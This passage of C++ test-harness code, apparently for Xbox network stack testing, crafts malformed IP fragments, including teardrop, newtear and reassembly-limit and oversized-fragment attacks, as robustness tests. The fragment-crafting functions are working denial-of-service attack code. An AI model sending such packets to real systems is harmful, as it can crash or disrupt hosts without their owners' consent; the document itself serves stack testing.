			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag((i == 63) ? 0 : IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset(i * 128);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);

			switch(i)
			{
			case 0:
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1016, TRUE);
				break;
			case 63:
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1023);
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1023, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1024, TRUE);
				break;
			}


			if(i == 0)
			{
				CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64 * 1024 - 1);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMaxReassemblySizeAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of a 2K datagram (exactly default max reassembly size)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxReassemblySizeAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 2);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(2 * 1024);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1016, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(128);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1024, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragAboveMaxReassemblySizeAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of a 2K + 1 datagram (one above default max reassembly size)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragAboveMaxReassemblySizeAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1025];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 3);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
			
			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(2 * 1024 + 1);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1016, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(128);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1025);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1025, TRUE);
				break;
			}


			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMaxSimulReassemblyAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of 4 datagrams before completing
// any of them (exactly the maximum number of simultaneous reassemblies)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxSimulReassemblyAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
	
	for(INT i = 0; i < 2; ++i)
	{
		for(INT j = 0; j < SIM_REASM_MAX; ++j)			
		{
			// Watch for SPARTA exceptions
			try
			{
				// Create and initialize the IP packet
				pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);
				
				// Fill in the IP header fields
				pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
				pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
				pIPPacket->MacHeader.SetProtocolType(0x800);
				pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
				pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
				pIPPacket->IPHeader.SetID(IPID_DEFAULT + j);
				pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
				pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
				pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
				pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
				pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
				pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

				switch(i)
				{
				case 0:
					pUDPPacket = (CUDPPacket *) pIPPacket;
					pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
					pUDPPacket->UDPHeader.SetDestPort((UDPPORT_DEST + j + MAX_SIMUL_PORT_OFFSET) % MAXWORD + 1);
					pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
					pUDPPacket->UDPHeader.SetLength(32);
					pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
					pUDPPacket->UDPHeader.SetChecksum(0);
					
					pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
					pIPPacket->IPHeader.SetFragOffset(0);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
					break;
				default:
					pIPPacket->IPHeader.SetFlag(0);
					pIPPacket->IPHeader.SetFragOffset(2);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
					break;
				}
				
				
				// Send the packet
				pInterface->Send(*pIPPacket);
			}
			catch(CSpartaException *Ex)
			{
				delete Ex;
			}
			
			// Release the packet
			if(pIPPacket)
			{
				delete pIPPacket;
				pIPPacket = NULL;
			}
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragAboveMaxSimulReassemblyAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of 5 datagrams before completing
// any of them (one above the maximum number of simultaneous reassemblies)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragAboveMaxSimulReassemblyAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
	
	for(INT i = 0; i < 2; ++i)
	{
		for(INT j = 0; j < SIM_REASM_MAX + 1; ++j)			
		{
			// Watch for SPARTA exceptions
			try
			{
				// Create and initialize the IP packet
				pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);
				
				// Fill in the IP header fields
				pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
				pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
				pIPPacket->MacHeader.SetProtocolType(0x800);
				pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
				pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
				pIPPacket->IPHeader.SetID(IPID_DEFAULT + j);
				pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
				pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
				pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
				pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
				pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
				pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
			
				switch(i)
				{
				case 0:
					pUDPPacket = (CUDPPacket *) pIPPacket;
					pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
					pUDPPacket->UDPHeader.SetDestPort((UDPPORT_DEST + j + ABOVE_MAX_SIMUL_PORT_OFFSET) % MAXWORD + 1);
					pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
					pUDPPacket->UDPHeader.SetLength(32);
					pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
					pUDPPacket->UDPHeader.SetChecksum(0);
					
					pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
					pIPPacket->IPHeader.SetFragOffset(0);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
					break;
				default:
					pIPPacket->IPHeader.SetFlag(0);
					pIPPacket->IPHeader.SetFragOffset(2);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
					break;
				}
				
				
				// Send the packet
				pInterface->Send(*pIPPacket);
			}
			catch(CSpartaException *Ex)
			{
				delete Ex;
			}
			
			// Release the packet
			if(pIPPacket)
			{
				delete pIPPacket;
				pIPPacket = NULL;
			}
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragOversizedFragmentsAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends oversized fragment to try and empty the Xbox buffer
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOversizedFragmentsAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[100];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < OVERSIZED_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset((USHORT) i);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int) i, sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, sizeof(PayloadBuffer), TRUE);

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackTeardropAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original teardrop attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackTeardropAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + TEARDROP_SIZE);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + TEARDROP_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, TEARDROP_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(TEARDROP_XVALUE);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + TEARDROP_XVALUE + 1);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, TEARDROP_XVALUE + 1, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackNewTeardropAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original newtear attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackNewTeardropAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + NEWTEAR_SIZE * 2);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + NEWTEAR_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, NEWTEAR_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(NEWTEAR_XVALUE);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + NEWTEAR_XVALUE + 1);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, NEWTEAR_XVALUE + 1, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackImpTeardropAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the teardrop attack.  This attack consists of
// one IP fragment with offset 0, more-fragments set and a payload of N bytes followed
// by another fragment with offset <N, more-fragments cleared and a payload that when
// added to the offset, is still less than N.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackImpTeardropAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

